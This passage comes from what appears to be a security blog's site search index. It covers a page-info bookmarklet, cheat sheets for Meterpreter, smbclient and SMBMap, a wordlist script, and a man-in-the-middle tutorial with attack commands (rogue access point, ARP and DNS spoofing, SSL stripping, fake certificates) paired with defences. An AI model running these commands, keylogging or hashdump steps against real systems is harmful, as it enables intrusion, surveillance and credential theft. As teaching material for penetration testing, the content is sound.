target=\u0026#34;_blank\u0026#34;\u0026gt;\u0026#39;+links[i].href+\u0026#39;\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;/table\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Images:\u0026lt;/h2\u0026gt;\u0026#39;);for(var i=0;i\u0026lt;images.length;i++){newWindow.document.write(\u0026#39;\u0026lt;img src=\u0026#34;\u0026#39;+images[i].src+\u0026#39;\u0026#34; style=\u0026#34;max-width:100%;display:block;margin-bottom:10px;\u0026#34;\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Word Count:\u0026lt;/h2\u0026gt;\u0026lt;p\u0026gt;\u0026#39;+wordCount+\u0026#39; words\u0026lt;/p\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u0026#39;);newWindow.document.close();})(); Save the bookmark.\nThat’s it! You now have a bookmarklet ready to extract webpage info.\nHow to Use Navigate to the webpage you want to analyze.\nClick on the saved bookmarklet.\nA new window will pop up with the following details:\nForms: Lists actions, methods, and input fields.\nLinks: Displays all hyperlinks found on the page.\nImages: Previews all images on the page.\nWord Count: Shows the total word count of the page’s text content.\nWhy Use It? This tool is perfect for:\nWeb Developers: Debugging forms, analyzing links, or reviewing images for optimization.\nContent Creators: Counting words or inspecting embedded media.\nResearchers: Extracting links or analyzing page structures quickly.\nIt’s not trying to replace full-fledged tools like browser dev tools, but it’s great for quick insights without digging into a complex interface.\nLimitations This bookmarklet is lightweight and portable, but it’s not flawless. Here are a few things to keep in mind:\nBrowser Compatibility: It works on most modern browsers but may struggle with certain page structures or dynamic content.\nStatic Analysis: It doesn’t execute JavaScript-heavy elements, so it’s best suited for simpler pages.\nBasic Formatting: The output is clean but not customizable.\nFinal Thoughts The Webpage Infos Extractor isn’t revolutionary, but it’s incredibly handy. Whether you’re troubleshooting a webpage or casually analyzing content, this bookmarklet gives you the essentials at a click. Simple, portable, and effective (sometimes), that’s all you need. If you think of ways to enhance it, feel free to tweak the code and make it your own!\n","permalink":"http://localhost:1313/tools/webpage_infos_extractor/","summary":"\u003cp\u003eWhen you need to quickly understand the structure of a webpage, a lightweight tool can save the day. \u003cstrong\u003eWebpage Infos Extractor\u003c/strong\u003e is just that: a simple JavaScript bookmarklet that extracts useful information like forms, links, images, and word count from any webpage. No extensions or extra software required—just a single bookmark to get key insights instantly.\u003c/p\u003e\n\u003ch2 id=\"why-build-this\"\u003eWhy Build This?\u003c/h2\u003e\n\u003cp\u003eSometimes, the simplest tools are the most convenient. I needed a way to peek under the hood of webpages during quick tests or casual research without opening dev tools every time. So, I threw together this bookmarklet to make data analysis fast and portable. It’s not groundbreaking, but it gets the job done without any fuss.\u003c/p\u003e","title":"Webpage Infos Extractor"},{"content":"Basic Commands Start with the essentials to get a lay of the land:\nhelp: Display a list of available commands (your lifeline when you\u0026rsquo;re lost). sysinfo: Get basic system information, including OS and hostname (think of it as a \u0026ldquo;who am I dealing with?\u0026rdquo;). ps: List running processes. kill \u0026lt;PID\u0026gt;: Terminate a process by its PID (because some processes just need to \u0026ldquo;go away\u0026rdquo;). migrate \u0026lt;PID\u0026gt;: Move Meterpreter to a different process to stay under the radar. rev2self: Revert privileges to the original user (a \u0026ldquo;reset button\u0026rdquo; for when things get weird). File System Commands For poking around the file system:\nls: List files in the current directory. cd \u0026lt;path\u0026gt;: Change to a new directory. pwd: Print the current working directory. cat \u0026lt;filename\u0026gt;: Display the contents of a file. download \u0026lt;filename\u0026gt;: Pull a file from the target to your local machine. upload \u0026lt;filename\u0026gt;: Push a file to the target system. Network Commands To scope out the network situation:\nipconfig: Display network configuration (IP addresses, gateways, etc.). route: Show the routing table. netstat: View active network connections. portfwd [add/remove]: Set up port forwarding (e.g., local port -\u0026gt; remote service). getsockname: Identify the socket name for a connection. User Management Commands Understand who you are and who else is around:\ngetuid: Display the current user ID. ps: See running processes and their owners. getprivs: List the privileges available to the current user. getsystem: Attempt to escalate privileges to SYSTEM (good luck!). Persistence Commands Stick around longer than you’re welcome:\npersistence: Enable Meterpreter persistence on the target (requires autorun setup). run \u0026lt;script\u0026gt;: Execute scripts or commands at startup. Shell Commands Take a deeper dive with shell access:\nshell: Open a command prompt on the target (sometimes, old-school is best). execute -f \u0026lt;command\u0026gt;: Run a command on the target. background: Push your current session into the background to multitask. Ctrl+Z: Suspend the current session (don’t forget to resume it later). Other Commands For the extra \u0026ldquo;James Bond\u0026rdquo; touch:\nuse \u0026lt;extension\u0026gt;: Load a Meterpreter extension (e.g., incognito, sniffer). keyscan_start: Begin logging keystrokes (capture your target’s every typo). keyscan_dump: Dump the logged keystrokes. screenshot: Capture a screenshot of the target’s desktop. webcam_list: See available webcams on the target. webcam_snap: Take a snapshot from a webcam. hashdump: Dump password hashes (everyone’s favorite). timestomp \u0026lt;file\u0026gt;: Modify the timestamps of a file (because subtlety matters). Tips and Tricks Migrate Smartly: When migrating, pick a process that’s stable (e.g., explorer.exe) and won’t raise suspicions. Background Often: Always background your session before launching new exploits—multitasking is key. Scripting is King: Use Meterpreter scripts (run \u0026lt;script\u0026gt;) to automate repetitive tasks. ","permalink":"http://localhost:1313/cheat-sheets/meterpreter/","summary":"\u003ch2 id=\"basic-commands\"\u003eBasic Commands\u003c/h2\u003e\n\u003cp\u003eStart with the essentials to get a lay of the land:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003ehelp\u003c/code\u003e\u003c/strong\u003e: Display a list of available commands (your lifeline when you\u0026rsquo;re lost).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003esysinfo\u003c/code\u003e\u003c/strong\u003e: Get basic system information, including OS and hostname (think of it as a \u0026ldquo;who am I dealing with?\u0026rdquo;).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003eps\u003c/code\u003e\u003c/strong\u003e: List running processes.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003ekill \u0026lt;PID\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Terminate a process by its PID (because some processes just need to \u0026ldquo;go away\u0026rdquo;).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003emigrate \u0026lt;PID\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Move Meterpreter to a different process to stay under the radar.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003erev2self\u003c/code\u003e\u003c/strong\u003e: Revert privileges to the original user (a \u0026ldquo;reset button\u0026rdquo; for when things get weird).\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"file-system-commands\"\u003eFile System Commands\u003c/h2\u003e\n\u003cp\u003eFor poking around the file system:\u003c/p\u003e","title":"Meterpreter"},{"content":"smbclient is a command-line tool that allows you to interact with SMB (Server Message Block) file shares. Whether you’re uploading files, listing directories, or troubleshooting network shares, this tool is your go-to for SMB.\nBasic Usage To connect to an SMB file share, use the following syntax:\nsmbclient //server/share [options] Replace server with the hostname or IP address of the server hosting the file share. Replace share with the name of the file share. Once connected, you will be prompted for credentials. After successful authentication, a command prompt will allow you to interact with the share.\nCommon Options -U \u0026lt;username\u0026gt;: Specify the username to use for authentication. -W \u0026lt;workgroup\u0026gt;: Specify the domain or workgroup. -I \u0026lt;IP address\u0026gt;: Directly specify the server\u0026rsquo;s IP address. -p \u0026lt;port\u0026gt;: Specify the port (default is 445). -d \u0026lt;debug level\u0026gt;: Set the debug level for verbose output. -N: Suppress the password prompt (useful for guest accounts). Available Commands Once connected, the following commands allow you to interact with the file share:\nls: List files and directories in the current directory. cd \u0026lt;directory\u0026gt;: Change to a different directory. pwd: Print the current working directory. put \u0026lt;file\u0026gt;: Upload a file to the share. get \u0026lt;file\u0026gt;: Download a file from the share. mput \u0026lt;files\u0026gt;: Upload multiple files. mget \u0026lt;files\u0026gt;: Download multiple files. rm \u0026lt;file\u0026gt;: Delete a file. mkdir \u0026lt;directory\u0026gt;: Create a new directory. rmdir \u0026lt;directory\u0026gt;: Remove a directory. exit: Disconnect from the share and exit smbclient. Examples List Files in a Share smbclient //server/share -c ls Connect with a Specific Username and Password smbclient //server/share -U username%password Connect Using an IP Address and Port smbclient //server/share -I 192.168.1.100 -p 139 Upload a File smbclient //server/share -c \u0026#34;put /path/to/local/file\u0026#34; Download a File smbclient //server/share -c \u0026#34;get /path/to/remote/file\u0026#34; Create a New Directory smbclient //server/share -c \u0026#34;mkdir newdirectory\u0026#34; When to Use smbclient Quick Access: Need to interact with a file share without mounting it? smbclient gives you immediate access. Testing Permissions: Check which directories and files are accessible under different credentials. File Operations: Download, upload, or manage files on SMB shares. Debugging: Troubleshoot network shares with verbose output using -d. Final Thoughts smbclient is a powerful yet straightforward tool for interacting with SMB shares. Whether you’re performing quick tests or conducting audits, it streamlines tasks that would otherwise require mounting shares. Keep this cheat sheet handy for quick reference and efficient file share management!\n","permalink":"http://localhost:1313/cheat-sheets/smbclient/","summary":"\u003cp\u003e\u003cstrong\u003esmbclient\u003c/strong\u003e is a command-line tool that allows you to interact with SMB (Server Message Block) file shares. Whether you’re uploading files, listing directories, or troubleshooting network shares, this tool is your go-to for SMB.\u003c/p\u003e\n\u003ch2 id=\"basic-usage\"\u003eBasic Usage\u003c/h2\u003e\n\u003cp\u003eTo connect to an SMB file share, use the following syntax:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbclient //server/share \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eoptions\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eReplace \u003cstrong\u003e\u003ccode\u003eserver\u003c/code\u003e\u003c/strong\u003e with the hostname or IP address of the server hosting the file share.\u003c/li\u003e\n\u003cli\u003eReplace \u003cstrong\u003e\u003ccode\u003eshare\u003c/code\u003e\u003c/strong\u003e with the name of the file share.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eOnce connected, you will be prompted for credentials. After successful authentication, a command prompt will allow you to interact with the share.\u003c/p\u003e","title":"smbclient"},{"content":"SMBMap is a command-line tool for enumerating and interacting with SMB shares. It allows you to execute commands, upload/download files, and assess permissions effectively.\nBasic Syntax smbmap -u \u0026lt;username\u0026gt; -p \u0026lt;password\u0026gt; -H \u0026lt;host\u0026gt; [options] Common Usage Examples Connect with Null Password smbmap -u guest -p \u0026#34;\u0026#34; -d . -H 192.168.1.1 Connect as Admin with Password smbmap -u admin -p password123 -d . -H 192.168.1.1 Execute a Command smbmap -u admin -p password123 -d . -H 192.168.1.1 -x \u0026#39;ipconfig\u0026#39; Connect to a Specific Drive smbmap -u admin -p password123 -d . -H 192.168.1.1 -r \u0026#39;C$\u0026#39; Upload a File smbmap -u admin -p password123 -d . -H 192.168.1.1 --upload \u0026#39;/path/to/file.txt\u0026#39; \u0026#39;C$\\file.txt\u0026#39; Download a File smbmap -u admin -p password123 -d . -H 192.168.1.1 --download \u0026#39;C$\\file.txt\u0026#39; Enumerate a Specific Share smbmap -H 192.168.1.1 -s \u0026#39;share_name\u0026#39; Enumerate Users smbmap -H 192.168.1.1 --users Key Options -u \u0026lt;username\u0026gt;: Specify the username. -p \u0026lt;password\u0026gt;: Specify the password. -H \u0026lt;host\u0026gt;: Specify the target host. -r \u0026lt;share\u0026gt;: Connect to a specific share or drive. -x \u0026lt;command\u0026gt;: Execute a command on the target. --upload \u0026lt;local_file\u0026gt; \u0026lt;remote_path\u0026gt;: Upload a file to the target. --download \u0026lt;remote_file\u0026gt;: Download a file from the target. -s \u0026lt;share\u0026gt;: Enumerate a specific share. --users: Enumerate users on the target. -R: Check for shares with full permissions. -p \u0026lt;port\u0026gt;: Specify a port. When to Use SMBMap Permission Audits: Quickly identify shares with read, write, or full access permissions. Command Execution: Execute remote commands on accessible shares. File Transfers: Upload or download files directly from SMB shares. User Enumeration: Discover user accounts configured on the target system. Final Thoughts SMBMap is an efficient and user-friendly tool for SMB enumeration and interaction. Its flexibility makes it ideal for penetration testing and auditing SMB shares. Keep this cheat sheet handy to streamline your workflows.\n","permalink":"http://localhost:1313/cheat-sheets/smbmap/","summary":"\u003cp\u003e\u003cstrong\u003eSMBMap\u003c/strong\u003e is a command-line tool for enumerating and interacting with SMB shares. It allows you to execute commands, upload/download files, and assess permissions effectively.\u003c/p\u003e\n\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u \u0026lt;username\u0026gt; -p \u0026lt;password\u0026gt; -H \u0026lt;host\u0026gt; \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eoptions\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-usage-examples\"\u003eCommon Usage Examples\u003c/h2\u003e\n\u003ch3 id=\"connect-with-null-password\"\u003eConnect with Null Password\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u guest -p \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e -d . -H 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"connect-as-admin-with-password\"\u003eConnect as Admin with Password\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"execute-a-command\"\u003eExecute a Command\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 -x \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ipconfig\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"connect-to-a-specific-drive\"\u003eConnect to a Specific Drive\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 -r \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;C$\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"upload-a-file\"\u003eUpload a File\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 --upload \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;/path/to/file.txt\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;C$\\file.txt\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"download-a-file\"\u003eDownload a File\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 --download \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;C$\\file.txt\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-a-specific-share\"\u003eEnumerate a Specific Share\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -H 192.168.1.1 -s \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;share_name\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-users\"\u003eEnumerate Users\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -H 192.168.1.1 --users\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"key-options\"\u003eKey Options\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-u \u0026lt;username\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the username.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;password\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the password.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-H \u0026lt;host\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the target host.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-r \u0026lt;share\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Connect to a specific share or drive.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-x \u0026lt;command\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Execute a command on the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--upload \u0026lt;local_file\u0026gt; \u0026lt;remote_path\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Upload a file to the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--download \u0026lt;remote_file\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Download a file from the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-s \u0026lt;share\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Enumerate a specific share.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--users\u003c/code\u003e\u003c/strong\u003e: Enumerate users on the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-R\u003c/code\u003e\u003c/strong\u003e: Check for shares with full permissions.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;port\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify a port.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"when-to-use-smbmap\"\u003eWhen to Use SMBMap\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003ePermission Audits\u003c/strong\u003e: Quickly identify shares with read, write, or full access permissions.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCommand Execution\u003c/strong\u003e: Execute remote commands on accessible shares.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eFile Transfers\u003c/strong\u003e: Upload or download files directly from SMB shares.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eUser Enumeration\u003c/strong\u003e: Discover user accounts configured on the target system.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"final-thoughts\"\u003eFinal Thoughts\u003c/h2\u003e\n\u003cp\u003eSMBMap is an efficient and user-friendly tool for SMB enumeration and interaction. Its flexibility makes it ideal for penetration testing and auditing SMB shares. Keep this cheat sheet handy to streamline your workflows.\u003c/p\u003e","title":"SMBMap"},{"content":"Sometimes you just need a clean wordlist without the frills of a complicated tool. That’s where this Wordlist Generator comes in. It’s a simple Bash script designed to pull unique words from one or more text files, sort them, and save them neatly into a wordlist. Whether you’re prepping for a dictionary attack, building a natural language dataset, or just satisfying your curiosity, this script gets the job done quickly and efficiently.\nWhy Bash? You might be asking, why Bash? Well, there’s beauty in simplicity. This script was created to strip down the task to its essentials: no dependencies, no extra fuss, just the native power of Bash. While there are plenty of tools out there for generating wordlists, this one leans into the Unix philosophy—do one thing, and do it well.\nHow It Works The script takes one or more text files as input, extracts the words, normalizes them to lowercase, removes duplicates, sorts them, and outputs everything into a file called wordlist.txt. The end result? A clean, ordered list of unique words ready for your next project.\nKey Features Simple Input: Accepts multiple text files as input. Automatic Sorting: Ensures the wordlist is alphabetically ordered. No Dependencies: Works out of the box with any modern Bash shell. Efficiency: Processes files with a single command pipeline. Getting Started Installation Just grab the script at the bottom of this page, make it executable, and you’re good to go. Or you can get it on my github :\ngit clone https://github.com/noobosaurus-r3x/Wordlister cd Wordlister chmod +x wordlister.sh Usage The script is designed to be intuitive and easy to use. Here’s the basic syntax:\n./wordlister.sh file1.txt file2.txt file3.txt What It Does Combines the contents of all provided text files. Extracts words by splitting on non-alphanumeric characters. Converts all words to lowercase to avoid duplicates like Word and word. Removes duplicates entirely. Outputs the results into wordlist.txt in the current directory. Example Imagine you have two text files, file1.txt and file2.txt, and you want to generate a wordlist:\nRun the script:\n./wordlister.sh file1.txt file2.txt The script processes the files and outputs:\nCreated wordlist with 500 words Open wordlist.txt to see your results.\nNotes If no files are provided, the script will display a usage message and exit. The output file is overwritten each time the script runs, so be sure to back up your previous wordlists if needed. The Script For those who want a peek under the hood, here’s the full script:\n#!/usr/bin/env bash set -euo pipefail IFS=$\u0026#39;\\n\\t\u0026#39; if [ $# -eq 0 ]; then echo \u0026#34;Usage: $0 \u0026lt;text_file1\u0026gt; [\u0026lt;text_file2\u0026gt; ...]\u0026#34; exit 1 fi wordlist=\u0026#34;wordlist.txt\u0026#34; # Process input files to extract unique words in lowercase LC_ALL=C cat \u0026#34;$@\u0026#34; \\ | tr -c \u0026#39;[:alnum:]\u0026#39; \u0026#39;\\n\u0026#39; \\ | tr \u0026#39;[:upper:]\u0026#39; \u0026#39;[:lower:]\u0026#39; \\ | sort -u \u0026gt; \u0026#34;$wordlist\u0026#34; word_count=$(wc -l \u0026lt; \u0026#34;$wordlist\u0026#34;) echo \u0026#34;Created wordlist with $word_count words\u0026#34; Why Use This Script? If you need a no-nonsense way to generate a wordlist, this script has you covered. It’s lightweight, fast, and doesn’t require any external tools or libraries. Whether you’re working in cybersecurity, natural language processing, or simply organizing your text data, this Bash script is a reliable companion.\nFinal Thoughts Sometimes the simplest tools are the most effective. This wordlist generator isn’t trying to be fancy; it’s just trying to do the job—and it does it well. If you’ve got improvements or ideas, feel free to tweak the script to fit your needs. After all, the best tools are the ones you make your own.\n","permalink":"http://localhost:1313/tools/wordlister/","summary":"\u003cp\u003eSometimes you just need a clean wordlist without the frills of a complicated tool. That’s where this \u003cstrong\u003eWordlist Generator\u003c/strong\u003e comes in. It’s a simple Bash script designed to pull unique words from one or more text files, sort them, and save them neatly into a wordlist. Whether you’re prepping for a dictionary attack, building a natural language dataset, or just satisfying your curiosity, this script gets the job done quickly and efficiently.\u003c/p\u003e","title":"Wordlister"},{"content":"MITM Attacks: How to Crash the Party Between Alice and Bob Man-in-the-Middle attacks (MITM) are like showing up uninvited to someone else’s private conversation, grabbing a chair, and whispering, “Don’t mind me.” Except, instead of tea and gossip, the stakes are passwords, credit card numbers, and the little details your digital life holds. Carol—the uninvited hacker—isn’t just listening; she’s reading, stealing, and sometimes tweaking what’s being said.\nToday, we’ll crash this party and take a look at how Carol pulls off her tricks, why they work, and what you can do to stop her from making herself at home in your traffic.\nWhat Even Is a Man-in-the-Middle Attack? Picture this: Alice and Bob are exchanging secrets—love letters, memes, bank details, or maybe just complaining about Carol. They think they’re communicating directly, but little do they know, Carol is sitting in the middle, reading every word, tweaking the conversation, and cackling like a villain in a bad spy movie.\nIn the digital world, Alice could be your laptop, Bob a website or server, and Carol a hacker lurking on your café’s Wi-Fi or corporate network. She intercepts traffic, decrypts it (sometimes), and messes with it however she pleases.\nThe terrifying part? This can happen to you without you realizing it—until it’s too late.\nHow Carol Crashes the Party: Common MITM Tricks Carol’s bag of tricks is stuffed with clever (and sometimes shockingly simple) ways to hijack your traffic. Here’s how she pulls it off:\n1. Rogue Wi-Fi Access Points: Carol’s Favorite Honeytrap Setting up a rogue Wi-Fi access point doesn’t require much more than a laptop, a coffee shop corner, and a catchy SSID like Free_Cafe_WiFi or Starbux_Free. You think you’re connecting to free Wi-Fi for your overpriced latte, but you’re actually walking straight into Carol’s trap.\nHow It Works (The Tech Bit): Broadcast the Trap: Carol uses tools like Airbase-ng to create a fake access point. airbase-ng -e \u0026#34;Starbux_Guest\u0026#34; -c 6 wlan0mon Monitor the Victims: Your device connects, trusting the familiar name. Carol now acts as the gateway to the internet. Proxy the Traffic: With tools like ettercap or mitmproxy, Carol routes all your traffic through her machine. She can sniff, modify, or inject malware at will. bettercap -T -q -M arp:remote // // -i wlan0 Optional Evil Fun: Carol can inject JavaScript keyloggers, replace downloads with malware, or redirect DNS queries to phishing pages. Why It’s Effective Devices love auto-connecting to networks they recognize, and humans… well, we love free Wi-Fi.\nDefense Tip: Always use a VPN. It wraps your data in encryption, making Carol’s snooping session as useful as watching a scrambled TV channel from the 90s.\n2. ARP Spoofing: “Hi, I’m the Router Now” ARP (Address Resolution Protocol) is like the phonebook for local networks, mapping IP addresses to MAC addresses. But ARP has a fatal flaw: it trusts everyone. Carol exploits this blind trust to impersonate the router and redirect all traffic through herself.\nHow It Works: Carol tells the router: “Hey, I’m Alice.” Carol tells Alice: “Hey, I’m the router.” Traffic meant for Alice or the router now flows through Carol. arpspoof -i eth0 -t 192.168.1.10 -r 192.168.1.1 Why It’s Effective On a LAN, ARP spoofing is lightning-fast and stealthy. Carol can:\nSniff unencrypted traffic with Wireshark. Modify requests in real time. Drop packets because chaos is fun. The Tell: On compromised machines, running arp -a often exposes duplicate MAC addresses—a sign Carol’s in the mix.\nDefense Tip: Use ARP detection tools like Arpwatch or enable Dynamic ARP Inspection (DAI) on managed switches.\n3. DNS Spoofing: Carol’s Redirection Magic You type bank.com into your browser. Carol decides that’s cute and redirects you to fak3bank.com—a malicious clone where she harvests your login details.\nHow It Works: Carol intercepts DNS requests (via tools like tcpdump): tcpdump -i eth0 udp port 53 She injects a fake DNS response faster than the real DNS server: dnsspoof -i eth0 -f dns_hosts Example dns_hosts file: 133.7.133.7 google.com You land on Carol’s server, which looks real enough for you to log in like a good, oblivious citizen. Defense Tip: Use DNSSEC to validate DNS responses and encrypt queries with DNS-over-HTTPS (DoH).\n4. SSL Stripping: Downgrading You Back to 2005 You know HTTPS—the comforting padlock in your browser bar? Carol strips it away like a magician revealing a trapdoor.\nHow It Works: You type https://example.com. Carol intercepts and strips the HTTPS headers, forcing a plain old HTTP connection. Everything—passwords, credit card info, embarrassing searches—travels unencrypted. bettercap -iface eth0 -caplet https-ui Carol logs it all. The tiny missing s in HTTPS becomes the gateway to your digital life.\nDefense Tip: Use HSTS (HTTP Strict Transport Security) and browser extensions like HTTPS Everywhere to force secure connections.\n5. HTTPS Spoofing: Fake Certificates, Real Problems If SSL stripping is a blunt hammer, HTTPS spoofing is a precision scalpel. Carol doesn’t remove encryption—she fakes it.\nHow It Works: Carol generates a self-signed SSL certificate to impersonate a legitimate server: openssl req -new -x509 -keyout fakekey.pem -out fakecert.pem She intercepts the connection, swapping the real SSL cert for her fake one. Your browser thinks it’s secure (padlock and all), and Carol decrypts everything. Why It Works Most people trust the padlock icon without ever inspecting the certificate details.\nDefense Tip: Use certificate pinning to reject impostor certificates and manually verify SSL certificates 